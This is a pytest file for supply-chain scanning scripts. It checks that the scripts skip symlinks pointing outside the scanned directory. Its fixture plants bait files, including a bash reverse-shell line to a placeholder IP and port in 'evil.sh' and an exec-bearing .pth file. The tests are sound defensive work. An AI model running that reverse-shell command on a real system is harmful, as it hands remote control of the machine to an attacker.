"""No script follows a symlink that points outside the target."""

import os

import pytest

from conftest import run_script, write


@pytest.fixture()
def target(tmp_path):
    outside = tmp_path / "outside"
    inside = tmp_path / "target"
    # bait outside the target: a malicious pin, an IOC, a reverse shell
    write(outside, "package-lock.json",
          '{"lockfileVersion": 3, "packages": {"node_modules/tensorlake": {"version": "0.5.144"}}}')
    write(outside, "evil.sh", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n# gh-token-monitor\n")
    write(outside, "cook.pth", "import os; exec('1')\n")
    write(inside, "src/app.py", "print('hello')\n")
    os.symlink(str(outside), str(inside / "linked_dir"))
    os.symlink(str(outside / "package-lock.json"), str(inside / "package-lock.json"))
    os.symlink(str(outside / "evil.sh"), str(inside / "src" / "evil.sh"))
    os.symlink(str(outside / "cook.pth"), str(inside / "cook.pth"))
    os.symlink("src/app.py", str(inside / "inner_link.py"))  # internal link, also not followed
    return inside


def test_inventory_reports_escaping_links(target):
    code, out, _ = run_script("inventory.py", str(target))
    assert code == 0
    escaping = set(out["symlinks_escaping"])
    assert {"linked_dir", "package-lock.json", "src/evil.sh", "cook.pth"} <= escaping
    assert "inner_link.py" not in escaping
    assert out["lockfiles"] == []
    assert out["files_total"] == 1


def test_feed_match_ignores_links(target):
    code, out, _ = run_script("feed_match.py", str(target))
    assert code == 0
    assert out["matches"] == []
    assert out["symlinks_skipped"] >= 4


def test_ioc_scan_ignores_links(target):
    code, out, _ = run_script("ioc_scan.py", str(target))
    assert code == 0
    assert out["hits"] == []
    assert out["inspected"]["files_scanned"] == 1


def test_symlinked_target_root_is_resolved(target, tmp_path):
    alias = tmp_path / "alias"
    os.symlink(str(target), str(alias))
    code, out, _ = run_script("feed_match.py", str(alias))
    assert code == 0 and out["matches"] == []


def test_read_helper_refuses_links(common, target):
    root = os.path.realpath(str(target))
    assert common.read_text(root, os.path.join(root, "package-lock.json")) is None
    assert common.read_text(root, os.path.join(root, "src", "app.py")) == "print('hello')\n"
